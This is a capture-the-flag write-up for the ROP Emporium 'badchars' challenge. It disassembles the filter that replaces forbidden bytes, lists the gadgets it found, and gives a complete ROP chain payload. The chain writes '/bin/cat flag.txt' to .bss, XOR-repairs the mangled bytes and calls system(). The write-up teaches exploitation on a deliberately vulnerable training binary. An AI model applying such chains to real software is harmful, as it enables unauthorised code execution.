---
title: 05_badchars
categories: [series, rop_emporium]
---

# ROP Emporium badchars

* **Tools:** IDA Free 7.0, gdb-gef, ropper, readelf
* **Prerequistes:** Stack frame
* **Download solution:** [main.py](/assets/series/rop_emporium/main.py)

## Overview

> "An arbitrary write challenge with a twist; certain input characters get mangled before finding their way onto the stack. [...]"

In this challenge, a function checks our input and if it contains some "special" characters, they are replaced by the byte `0xEB`. Otherwise, it is similar to the challenge [write4](/posts/ropemporium-write4/).

## Function pwnme() 

`_fgets()` takes an input of up to 0x200 bytes and stores it on the heap. Then, the length of this input is computed by the function `nstrlen()`: it stops when the character `0x0A` is found:
```
0x0000000000400A0E    mov     rdx, [rbp+user_input]
0x0000000000400A12    mov     rax, [rbp+i]
0x0000000000400A16    add     rax, rdx
0x0000000000400A19    movzx   eax, byte ptr [rax]
0x0000000000400A1C    cmp     al, 0Ah       ; line feed
0x0000000000400A1E    jnz     short next_char
0x0000000000400A20    add     [rbp+i], 1    ; +1
0x0000000000400A25    mov     rax, [rbp+i]
0x0000000000400A29    jmp     short exit
```
The length is returned in `rax` and used by the function `checkBadchars()` to check user input. Forbidden chars are replaced by `0xEB`:
```
0x0000000000400A90    mov     rdx, [rbp+user_input]
0x0000000000400A94    mov     rax, [rbp+i]  ; length input
0x0000000000400A98    add     rax, rdx
0x0000000000400A9B    movzx   edx, byte ptr [rax]
0x0000000000400A9E    lea     rcx, [rbp+badchars_array] ; <space>bcfins/
0x0000000000400AA2    mov     rax, [rbp+j]
0x0000000000400AA6    add     rax, rcx
0x0000000000400AA9    movzx   eax, byte ptr [rax]
0x0000000000400AAC    cmp     dl, al    ; cmp input[i], badchars[j]
0x0000000000400AAE    jnz     short ok
0x0000000000400AB0    mov     rdx, [rbp+user_input]
0x0000000000400AB4    mov     rax, [rbp+i]
0x0000000000400AB8    add     rax, rdx
0x0000000000400ABB    mov     byte ptr [rax], 0EBh ; patch
0x0000000000400ABE    jmp     short inc_counter
```
Once filtered, the user input is copied to the stack:
```
0x00000000004009B5    mov     rdx, [rbp+str_length] ; input length
[...]
0x00000000004009C5    mov     rsi, rax        ; src: filtered input
0x00000000004009C8    mov     rdi, rcx        ; dest
0x00000000004009CB    call    _memcpy
```

## Arbitraty write

As usual, `usefulFunction()` implements a "`call to system() with edi pointing to "/bin/ls"`". The string `"/bin/cat flag.txt"` is absent so we'll have to find an arbitrary write. 
The section `.bss` still seems to be a good place to write the string `"/bin/cat flag.txt"`:
```bash
readelf --sections ../challs/badchars
There are 31 section headers, starting at offset 0x1d08:

Section Headers:
[Nr] Name              Type             Address           Offset
     Size              EntSize          Flags  Link  Info  Align
[...]
[26] .bss              NOBITS           0000000000601080  00001080
       0000000000000030  0000000000000000  WA       0     0     32
[...]
```
We find 2 write gadgets:
```bash
ropper --search "mov [%]"  -f ../challs/badchars
[...]
[INFO] File: ../challs/badchars
0x0000000000400b35: mov dword ptr [rbp], esp; ret; 
0x0000000000400b34: mov qword ptr [r13], r12; ret; 
```
Focusing on the `r13` / `r12` pair:
```bash
ropper --search "??? r1?" -f ../challs/badchars
[...]
0x0000000000400bac: pop r12; pop r13; pop r14; pop r15; ret; 
0x0000000000400b3b: pop r12; pop r13; ret; 
0x0000000000400bae: pop r13; pop r14; pop r15; ret; 
0x0000000000400b3d: pop r13; ret; 
0x0000000000400b40: pop r14; pop r15; ret; 
0x0000000000400b42: pop r15; ret; 
```
In addition, if our input contains forbidden chars they will be replaced by `0xEB`. 
Whether we encode the user input before or let the function `checkBadchars()` replace the badchars, we'll need a gadget to fix things afterwards. In both cases a good old `xor` can do the trick:
```bash
ropper --search "xor ???" -f ../challs/badchars
[...]
0x0000000000400b30: xor byte ptr [r15], r14b; ret; 
0x0000000000400b31: xor byte ptr [rdi], dh; ret; 
```
And from the before last ropper output, we know we can control `r14` and `r15`.
Last gadget we need is a write into `rdi`:
```bash
ropper --search "??? rdi" -f ../challs/badchars
[...]
0x00000000004009d4: mov rdi, rax; call 0x6d0; nop; leave; ret; 
0x0000000000400b39: pop rdi; ret; 
```

## Building the chain

I opted for an non-encoded payload and just xoring the `0xEB` bytes to retrieve the correct `"/bin/cat flag.txt"` string. For example, let's say we want `0x62` to be the final result written somewhere: `0x62 ^ 0xEB = 0x89`.
The payload:
```python
payload = b''
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'  # fill buffer (overwrite RSP)

# Write to .bss
payload += b'\x3b\x0b\x40\x00\x00\x00\x00\x00'  # pop r12, pop r13, ret
payload += b'\x2f\x62\x69\x6e\x2f\x63\x61\x74'  # r12 = "/bin/cat"
payload += b'\x80\x10\x60\x00\x00\x00\x00\x00'  # r13 -> .bss
payload += b'\x34\x0b\x40\x00\x00\x00\x00\x00'  # mov [r13], r12

payload += b'\x3b\x0b\x40\x00\x00\x00\x00\x00'  # pop r12, pop r13, ret
payload += b'\x20\x66\x6c\x61\x67\x2e\x74\x78' # r12 = " flag.tx"
payload += b'\x88\x10\x60\x00\x00\x00\x00\x00'  # r13 -> .bss+8
payload += b'\x34\x0b\x40\x00\x00\x00\x00\x00'  # mov [r13], r12

payload += b'\x3b\x0b\x40\x00\x00\x00\x00\x00'  # pop r12, pop r13, ret
payload += b'\x74\x00\x00\x00\x00\x00\x00\x00'  # r12 = "t\x00"
payload += b'\x90\x10\x60\x00\x00\x00\x00\x00'  # r13 -> .bss+0x10
payload += b'\x34\x0b\x40\x00\x00\x00\x00\x00'  # mov [r13], r12

# Fix the \xEB bytes
# --- 0xc4 ^ 0xeb = 0x2f ("/")
payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
payload += b'\xc4\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0xc4 (xorkey n°1)
payload += b'\x80\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss (found badchar n°1)
payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
# --- 0x89 ^ 0xeb = 0x62 ("b")
payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
payload += b'\x89\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x89 (xorkey n°2)
payload += b'\x81\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+1 (found badchar n°2)
payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
# --- 0x82 ^ 0xeb = 0x69 ("i")
payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
payload += b'\x82\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x82 (xorkey n°3)
payload += b'\x82\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+2 (found badchar n°3)
payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
# --- 0x85 ^ 0xeb = 0x6e ("n")
payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
payload += b'\x85\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x85 (xorkey n°4)
payload += b'\x83\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+3 (found badchar n°4)
payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
# --- 0xc4 ^ 0xeb = 0x2f ("/")
payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
payload += b'\xc4\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0xc4 (xorkey n°5)
payload += b'\x84\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+4 (found badchar n°5)
payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
# --- 0x88 ^ 0xeb = 0x63 ("c")
payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
payload += b'\x88\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x88 (xorkey n°6)
payload += b'\x85\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+5 (found badchar n°6)
payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
# --- 0xcb ^ 0xeb = 0x20 (" ")
payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
payload += b'\xcb\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0xcb (xorkey n°7)
payload += b'\x88\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+8 (found badchar n°7)
payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret
# --- 0x8d ^ 0xeb = 0x66 (f")
payload += b'\x40\x0b\x40\x00\x00\x00\x00\x00'  # pop r14, pop r15, ret
payload += b'\x8d\x00\x00\x00\x00\x00\x00\x00'  # r14 = 0x8d (xorkey n°8)
payload += b'\x89\x10\x60\x00\x00\x00\x00\x00'  # r15 -> .bss+9 (found badchar n°8)
payload += b'\x30\x0b\x40\x00\x00\x00\x00\x00'  # xor [r15], r14b, ret

# Get flag
payload += b'\x39\x0b\x40\x00\x00\x00\x00\x00'  # pop rdi, ret
payload += b'\x80\x10\x60\x00\x00\x00\x00\x00'  # ->"/bin/cat flag.txt"
payload += b'\xe8\x09\x40\x00\x00\x00\x00\x00'  # call _system()
payload += b'\x43\x43\x43\x43\x43\x43\x43\x43'  # dummy (stack alignment)
payload += b'\xb9\x07\x40\x00\x00\x00\x00\x00'  # hlt
```

---
EOF
